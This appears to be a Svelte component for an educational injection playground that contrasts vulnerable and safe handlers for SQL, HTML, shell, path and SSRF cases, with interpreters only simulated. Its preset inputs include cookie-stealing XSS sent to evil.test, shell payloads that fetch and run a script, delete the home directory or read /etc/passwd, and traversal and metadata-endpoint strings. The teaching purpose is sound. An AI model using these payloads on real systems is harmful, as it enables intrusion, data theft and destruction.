<!--
  Injection, one interpreter at a time: type an attacker's input and see how SQL, HTML, a shell, the file system
  or an HTTP client reads the string the vulnerable handler builds, next to the safe version. Nothing is executed:
  the interpreters are simulated (src/lib/sa/taint/injection.ts), and the HTML preview is a sandboxed frame with
  scripts disabled. `::injection-playground{kinds="sql,html,shell,path,ssrf"}`.
-->
<script lang="ts">
  import Widget from '$lib/components/ui/Widget.svelte';
  import { classifyUrl, escapeHtml, isInside, joinPath, resolvePath, runSql, scanHtml, splitShell } from '$lib/sa/taint/injection';

  type Kind = 'sql' | 'html' | 'shell' | 'path' | 'ssrf';
  let {
    kinds = 'sql,html,shell,path,ssrf',
    initial,
    n,
    caption,
    title = 'Injection playground',
    subtitle = 'You are the attacker: type an input, or pick one, and compare the two handlers.',
  }: { kinds?: string; initial?: string; n?: string; caption?: string; title?: string; subtitle?: string } = $props();

  const KINDS: Record<Kind, { label: string; param: string; presets: string[]; vulnerable: string; safe: string }> = {
    sql: {
      label: 'SQL',
      param: 'name',
      presets: ['bob', "' OR '1'='1", "' OR 1=1 --", "alice' --", "x'; DROP TABLE users; --", "O'Brien"],
      vulnerable: `const rows = await db.query(
  "SELECT id, name FROM users WHERE name = '" + name + "' AND role = 'member'");`,
      safe: `const rows = await db.query(
  "SELECT id, name FROM users WHERE name = ? AND role = 'member'", [name]);`,
    },
    html: {
      label: 'HTML',
      param: 'name',
      presets: ['Ada', '<b>Ada</b>', '<img src=x onerror=alert(document.cookie)>', "<script>fetch('//evil.test/?c=' + document.cookie)<\/script>", '<a href="javascript:alert(1)">my profile</a>'],
      vulnerable: `res.send('<p>Hello, ' + name + '!</p>');`,
      safe: `res.send('<p>Hello, ' + escapeHtml(name) + '!</p>');`,
    },
    shell: {
      label: 'Shell',
      param: 'host',
      presets: ['example.com', 'example.com; cat /etc/passwd', 'example.com && rm -rf ~', '$(curl -s evil.test/x.sh | sh)', '-f localhost'],
      vulnerable: `exec('ping -c 1 ' + host, callback);`,
      safe: `execFile('ping', ['-c', '1', host], callback);`,
    },
    path: {
      label: 'Paths',
      param: 'name',
      presets: ['avatar.png', '../../../etc/passwd', '../config/.env', '/etc/passwd', 'a/../../uploads-old/secret.txt'],
      vulnerable: `res.sendFile(path.join('/srv/app/uploads', name));`,
      safe: `const file = path.resolve(ROOT, name);   // ROOT = '/srv/app/uploads'
if (!file.startsWith(ROOT + path.sep)) return res.sendStatus(403);
res.sendFile(file);`,
    },
    ssrf: {
      label: 'Requests',
      param: 'url',
      presets: ['https://images.example.com/cat.png', 'http://169.254.169.254/latest/meta-data/', 'http://localhost:6379/', 'https://images.example.com@127.0.0.1/admin', 'http://10.0.0.5/internal/report'],
      vulnerable: `const image = await fetch(url);`,
      safe: `const target = new URL(url);
if (target.protocol !== 'https:' || !ALLOWED_HOSTS.has(target.hostname)) return res.sendStatus(400);
const image = await fetch(target);   // ALLOWED_HOSTS = {'images.example.com'}`,
    },
  };
  const choices = $derived(kinds.split(',').map((s) => s.trim()).filter((k): k is Kind => k in KINDS));
  // svelte-ignore state_referenced_locally
  let kind = $state<Kind>((initial as Kind) ?? (kinds.split(',')[0]!.trim() as Kind));
  const inputs = $state<Record<Kind, string>>({ sql: "' OR 1=1 --", html: '<img src=x onerror=alert(document.cookie)>', shell: 'example.com; cat /etc/passwd', path: '../../../etc/passwd', ssrf: 'http://169.254.169.254/latest/meta-data/' });
  const spec = $derived(KINDS[kind]);
  const input = $derived(inputs[kind]);

  const sql = $derived.by(() => {
    const text = "SELECT id, name FROM users WHERE name = '" + inputs.sql + "' AND role = 'member'";
    return { text, vulnerable: runSql(text), safe: runSql("SELECT id, name FROM users WHERE name = ? AND role = 'member'", [inputs.sql]) };
  });
  const html = $derived.by(() => {
    const vulnerable = '<p>Hello, ' + inputs.html + '!</p>';
    const safe = '<p>Hello, ' + escapeHtml(inputs.html) + '!</p>';
    return { vulnerable, safe, v: scanHtml(vulnerable), s: scanHtml(safe) };
  });
  const shell = $derived({ line: 'ping -c 1 ' + inputs.shell, commands: splitShell('ping -c 1 ' + inputs.shell), argv: ['ping', '-c', '1', inputs.shell] });
  const ROOT = '/srv/app/uploads';
  const paths = $derived.by(() => {
    const joined = joinPath(ROOT, inputs.path);
    const resolved = resolvePath(ROOT, inputs.path);
    return { joined, joinedInside: isInside(ROOT, joined), resolved, resolvedInside: resolved.startsWith(ROOT + '/') };
  });
  const ssrf = $derived.by(() => {
    const t = classifyUrl(inputs.ssrf);
    let allowed = false;
    try {
      const u = new URL(inputs.ssrf);
      allowed = u.protocol === 'https:' && u.hostname === 'images.example.com';
    } catch {
      allowed = false;
    }
    return { t, allowed };
  });
  /** The query text with the attacker's part marked. */
  const marked = (text: string, part: string) => {
    const i = text.indexOf(part);
    return i < 0 || !part ? [{ t: text, mine: false }] : [{ t: text.slice(0, i), mine: false }, { t: part, mine: true }, { t: text.slice(i + part.length), mine: false }];
  };
</script>

<Widget {title} {subtitle} {n} {caption} onreset={() => { inputs[kind] = KINDS[kind].presets[1] ?? ''; }}>
  <div class="ip ui">
    {#if choices.length > 1}
      <div class="tabs" role="tablist" aria-label="Interpreter">
        {#each choices as k (k)}<button role="tab" aria-selected={k === kind} class:on={k === kind} onclick={() => (kind = k)}>{KINDS[k].label}</button>{/each}
      </div>
    {/if}
    <label class="field">
      <span><code>{spec.param}</code>, from the request</span>
      <input value={input} oninput={(e) => (inputs[kind] = e.currentTarget.value)} spellcheck="false" autocomplete="off" />
    </label>
    <div class="presets">
      {#each spec.presets as p (p)}<button class:on={p === input} onclick={() => (inputs[kind] = p)}><code>{p}</code></button>{/each}
    </div>
    <div class="cols">
      <section class="col bad">
        <h4>Vulnerable</h4>
        <pre class="code">{spec.vulnerable}</pre>
        {#if kind === 'sql'}
          <p class="what">The database receives:</p>
          <pre class="out">{#each marked(sql.text, inputs.sql) as s, i (i)}<span class:mine={s.mine}>{s.t}</span>{/each}</pre>
          {#if sql.vulnerable.statements.length > 1}<p class="warn">⚠ {sql.vulnerable.statements.length} statements. Drivers that allow several statements per call would also run: <code>{sql.vulnerable.statements.slice(1).join('; ')}</code></p>{/if}
          {#if sql.vulnerable.comment}<p class="warn">⚠ Ignored as a comment: <code>{sql.vulnerable.comment}</code></p>{/if}
          {#if sql.vulnerable.error}<p class="warn">⚠ Error: {sql.vulnerable.error}. Error messages shown to the user tell an attacker how the query is built.</p>
          {:else}<p class="what">{sql.vulnerable.rows.length} {sql.vulnerable.rows.length === 1 ? 'row' : 'rows'}: {sql.vulnerable.rows.map((r) => `${r.name} (${r.role})`).join(', ') || 'none'}</p>{/if}
        {:else if kind === 'html'}
          <p class="what">The browser receives:</p>
          <pre class="out">{html.vulnerable}</pre>
          {#if html.v.scripts.length}{#each html.v.scripts as s, i (i)}<p class="warn">⚠ Runs the attacker's JavaScript: {s.why} on <code>&lt;{s.tag}&gt;</code>.</p>{/each}
          {:else if html.v.tags.length > 1}<p class="warn">⚠ The input became markup: <code>{html.v.tags.slice(1).map((t) => `<${t}>`).join(' ')}</code>.</p>{/if}
          <iframe title="Vulnerable page, scripts disabled" sandbox="" srcdoc={html.vulnerable}></iframe>
        {:else if kind === 'shell'}
          <p class="what">The shell runs <code>sh -c "{shell.line}"</code>, which means:</p>
          <ol class="cmds">{#each shell.commands as c, i (i)}<li class:extra={i > 0 || c.via}>{#if c.via}<span class="via">{c.via === 'substitution' ? 'first, as a substitution' : `then (${c.via})`}</span> {/if}<code>{JSON.stringify(c.argv)}</code></li>{/each}</ol>
          {#if shell.commands.length > 1}<p class="warn">⚠ {shell.commands.length} commands instead of one.</p>{/if}
        {:else if kind === 'path'}
          <p class="what">The server reads:</p>
          <pre class="out">{paths.joined}</pre>
          <p class={paths.joinedInside ? 'ok' : 'warn'}>{paths.joinedInside ? '✓ Inside the uploads directory.' : '⚠ Outside the uploads directory.'}</p>
        {:else}
          <p class="what">The server sends a request to:</p>
          {#if ssrf.t.kind === 'invalid'}<p class="warn">Not a URL: the request fails.</p>
          {:else}
            <pre class="out">{ssrf.t.hostname}</pre>
            {#if ssrf.t.userinfo}<p class="warn">⚠ <code>{ssrf.t.userinfo}</code> is a user name in the URL, not the host.</p>{/if}
            <p class={ssrf.t.kind === 'public' ? 'what' : 'warn'}>{ssrf.t.kind === 'public' ? 'A public host: whatever it is, the request comes from the server, with its network access.' : `⚠ ${ssrf.t.kind}: a host the attacker cannot reach, but the server can.`}</p>
          {/if}
        {/if}
      </section>
      <section class="col good">
        <h4>Safe</h4>
        <pre class="code">{spec.safe}</pre>
        {#if kind === 'sql'}
          <p class="what">The database receives the query and, separately, one value: <code>{JSON.stringify(inputs.sql)}</code></p>
          <p class="ok">✓ {sql.safe.rows.length} {sql.safe.rows.length === 1 ? 'row' : 'rows'}{sql.safe.rows.length ? `: ${sql.safe.rows.map((r) => r.name).join(', ')}` : ''}. The value is compared with names, whatever it contains.</p>
        {:else if kind === 'html'}
          <p class="what">The browser receives:</p>
          <pre class="out">{html.safe}</pre>
          <p class="ok">✓ Text, displayed as typed.</p>
          <iframe title="Safe page" sandbox="" srcdoc={html.safe}></iframe>
        {:else if kind === 'shell'}
          <p class="what">No shell. The program receives exactly these arguments:</p>
          <pre class="out">{JSON.stringify(shell.argv)}</pre>
          {#if inputs.shell.startsWith('-')}<p class="warn">⚠ Still unsafe: an argument starting with <code>-</code> is read by <code>ping</code> as an option. Pass <code>'--'</code> before it, or validate the host.</p>{:else}<p class="ok">✓ One command, and the input is one argument.</p>{/if}
        {:else if kind === 'path'}
          <p class="what"><code>path.resolve</code> gives:</p>
          <pre class="out">{paths.resolved}</pre>
          <p class="ok">{paths.resolvedInside ? '✓ Inside the root: the file is served.' : '✓ Outside the root: the handler answers 403.'}</p>
        {:else}
          <p class="ok">{ssrf.allowed ? '✓ An allowed host over HTTPS: the request is made.' : '✓ Not an allowed host: the handler answers 400.'}</p>
        {/if}
      </section>
    </div>
  </div>
</Widget>

<style>
  .ip {
    display: grid;
    gap: 0.6rem;
  }
  .tabs,
  .presets {
    display: flex;
    flex-wrap: wrap;
    gap: 0.3rem;
  }
  .tabs button,
  .presets button {
    font: inherit;
    font-size: 0.8rem;
    border: 1px solid var(--line-strong);
    background: var(--panel);
    color: var(--fg);
    border-radius: 999px;
    padding: 0.15rem 0.7rem;
    cursor: pointer;
    max-width: 100%;
    overflow: hidden;
    text-overflow: ellipsis;
  }
  .presets button code {
    background: transparent;
    padding: 0;
  }
  .tabs button.on,
  .presets button.on {
    background: var(--accent);
    border-color: var(--accent);
    color: var(--accent-fg, #fff);
  }
  .presets button.on code {
    color: inherit;
  }
  .field {
    display: grid;
    gap: 0.2rem;
    font-size: 0.84rem;
  }
  .field input {
    font-family: var(--font-mono, monospace);
    font-size: 0.86rem;
    padding: 0.35rem 0.5rem;
    border: 1px solid var(--line-strong);
    border-radius: 6px;
    background: var(--panel);
    color: var(--fg);
    width: 100%;
    box-sizing: border-box;
  }
  .cols {
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(16rem, 1fr));
    gap: 0.8rem;
  }
  .col {
    min-width: 0;
    border: 1px solid var(--line);
    border-radius: 8px;
    padding: 0.6rem 0.7rem;
  }
  .col h4 {
    margin: 0 0 0.4rem;
    font-size: 0.86rem;
  }
  .col.bad h4 {
    color: var(--bad);
  }
  .col.good h4 {
    color: var(--ok);
  }
  pre {
    white-space: pre-wrap;
    overflow-wrap: anywhere;
    font-size: 0.78rem;
    margin: 0.3rem 0;
    padding: 0.4rem 0.5rem;
    border-radius: 6px;
    background: var(--panel-2, var(--panel));
  }
  pre.code {
    opacity: 0.85;
  }
  .mine {
    background: color-mix(in srgb, var(--bad) 22%, transparent);
    border-radius: 2px;
  }
  .what,
  .warn,
  .ok {
    font-size: 0.82rem;
    margin: 0.3rem 0;
    overflow-wrap: anywhere;
  }
  .warn {
    color: var(--bad);
  }
  .ok {
    color: var(--ok);
  }
  .cmds {
    font-size: 0.8rem;
    margin: 0.2rem 0;
    padding-left: 1.3rem;
  }
  .cmds li {
    overflow-wrap: anywhere;
  }
  .cmds li.extra {
    color: var(--bad);
  }
  .via {
    font-style: italic;
  }
  iframe {
    width: 100%;
    height: 4.5rem;
    border: 1px dashed var(--line-strong);
    border-radius: 6px;
    background: #fff;
  }
</style>
